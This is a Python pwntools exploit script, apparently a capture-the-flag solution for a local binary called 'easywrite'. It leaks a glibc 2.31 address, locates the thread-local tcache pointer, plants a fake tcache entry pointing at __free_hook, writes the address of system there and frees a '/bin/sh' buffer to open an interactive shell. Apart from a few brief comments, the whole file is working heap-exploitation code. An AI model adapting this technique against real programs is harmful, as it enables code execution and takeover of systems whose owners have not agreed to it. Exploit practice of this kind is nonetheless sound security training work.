#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

p = process('./easywrite')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')
# gdb.attach(p, 'b *$rebase(0x1335)\n')

# get TLS addr
# TLS->tcache = fake_tcache(free_hook in it)
# malloc && free()
 
if __name__ == "__main__":
  # leak libc && TLS 
  p.recvuntil('Here is your gift:')
  LIBC = eval(p.recv(14)) - 0x8ec50
  TLS = LIBC + 0x1f34f0
  __free_hook = LIBC + libc.sym['__free_hook']
  system = LIBC + 0x055410
  success('LIBC:  ' + str(hex(LIBC)))
  success('TLS:   ' + str(hex(TLS)))
  success('SYS:   ' + str(hex(system)))
  success('HOOK:  ' + str(hex(__free_hook)))

  # fake tcache
  payload = p64(0x0000000100000000) + p64(0) * 17 + p64(__free_hook - 8)
  p.sendafter('Input your message:', payload)
  sleep(0.1)
  p.sendafter('Where to write?:', p64(TLS))
  og = [0xe6e73, 0xe6e76, 0xe6e79]
  p.sendafter('Any last message?:', '/bin/sh\x00' + p64(system))
  sleep(0.1)
  p.interactive()